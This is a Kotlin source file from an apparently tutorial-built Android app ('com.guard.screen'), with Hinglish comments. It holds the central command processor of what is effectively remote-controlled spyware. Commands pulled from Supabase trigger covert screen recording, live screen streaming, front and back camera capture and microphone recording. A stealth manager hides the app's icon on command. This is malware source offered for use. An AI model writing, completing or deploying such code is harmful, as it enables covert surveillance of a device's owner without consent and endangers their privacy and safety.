package com.guard.screen.domain.usecase

import com.guard.screen.core.AppResult
import com.guard.screen.core.Constants
import com.guard.screen.core.ErrorType
import com.guard.screen.core.Logger
import com.guard.screen.data.model.Command
import com.guard.screen.data.repository.CommandRepository
import com.guard.screen.security.StealthManager
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Main command processor.
 * Supabase se aayi command ko parse karke sahi use case pe route karta hai.
 */
@Singleton
class ProcessCommandUseCase @Inject constructor(
    private val commandRepository: CommandRepository,
    private val recordScreenUseCase: RecordScreenUseCase,
    private val capturePhotoUseCase: CapturePhotoUseCase,
    private val recordAudioUseCase: RecordAudioUseCase,
    private val streamLiveScreenUseCase: StreamLiveScreenUseCase,
    private val stealthManager: StealthManager
) {

    /**
     * Command process karo.
     */
    suspend operator fun invoke(command: Command): AppResult<Boolean> {
        Logger.d("ProcessCommand", "Processing: ${command.cmd}")

        val commandId = command.id

        if (commandId.isNullOrBlank()) {
            Logger.e("ProcessCommand", "No command ID")
            return AppResult.Error(ErrorType.VALIDATION, "Command ID missing")
        }

        // Mark as processing
        commandRepository.updateCommandStatus(
            commandId, Constants.STATUS_PROCESSING
        )

        try {
            val (baseCmd, param) = command.parse()
            Logger.d("ProcessCommand", "Base: $baseCmd, Param: $param")

            val result = when (baseCmd) {

                // ========== SCREEN RECORDING ==========
                Constants.CMD_SCREEN_RECORD -> {
                    val duration = param?.toIntOrNull() ?: Constants.DEFAULT_SCREEN_DURATION
                    recordScreenUseCase(command.deviceKey, duration)
                }

                Constants.CMD_SCREEN_STOP -> {
                    // TODO: Stop screen recording service
                    AppResult.Success(true)
                }

                // ========== LIVE STREAM ==========
                Constants.CMD_LIVE_START -> {
                    streamLiveScreenUseCase(command.deviceKey)
                }

                Constants.CMD_LIVE_STOP -> {
                    streamLiveScreenUseCase.stop()
                    AppResult.Success(true)
                }

                // ========== CAMERA ==========
                Constants.CMD_CAM_FRONT -> {
                    capturePhotoUseCase(command.deviceKey, useFrontCamera = true)
                }

                Constants.CMD_CAM_BACK -> {
                    capturePhotoUseCase(command.deviceKey, useFrontCamera = false)
                }

                // ========== MICROPHONE ==========
                Constants.CMD_MIC_RECORD -> {
                    val duration = param?.toIntOrNull() ?: Constants.DEFAULT_MIC_DURATION
                    recordAudioUseCase(command.deviceKey, duration)
                }

                Constants.CMD_MIC_STOP -> {
                    recordAudioUseCase.stop()
                    AppResult.Success(true)
                }

                Constants.CMD_MIC_LIVE -> {
                    // TODO: Live mic streaming — Part 11 mein aayega
                    AppResult.Error(ErrorType.UNKNOWN, "Live mic not implemented")
                }

                // ========== DEVICE ==========
                Constants.CMD_PING -> {
                    // Heartbeat bhejo
                    AppResult.Success(true)
                }

                Constants.CMD_HIDE -> {
                    stealthManager.hideIcon()
                    AppResult.Success(true)
                }

                Constants.CMD_SHOW -> {
                    stealthManager.showIcon()
                    AppResult.Success(true)
                }

                else -> {
                    Logger.w("ProcessCommand", "Unknown command: $baseCmd")
                    AppResult.Error(ErrorType.VALIDATION, "Unknown command: $baseCmd")
                }
            }

            // Update final status
            when (result) {
                is AppResult.Success -> {
                    commandRepository.updateCommandStatus(
                        commandId, Constants.STATUS_DONE
                    )
                    Logger.i("ProcessCommand", "✓ ${command.cmd} completed")
                }
                is AppResult.Error -> {
                    commandRepository.updateCommandStatus(
                        commandId, Constants.STATUS_FAILED, result.message
                    )
                    Logger.e("ProcessCommand", "✗ ${command.cmd} failed: ${result.message}")
                }
                else -> {}
            }

            return when (result) {
                is AppResult.Success -> AppResult.Success(true)
                is AppResult.Error -> result
                else -> AppResult.Success(true)
            }

        } catch (e: Exception) {
            Logger.e("ProcessCommand", "Fatal error", e)
            commandRepository.updateCommandStatus(
                commandId, Constants.STATUS_FAILED, e.message
            )
            return AppResult.Error(ErrorType.UNKNOWN, e.message ?: "Error", e)
        }
    }
}
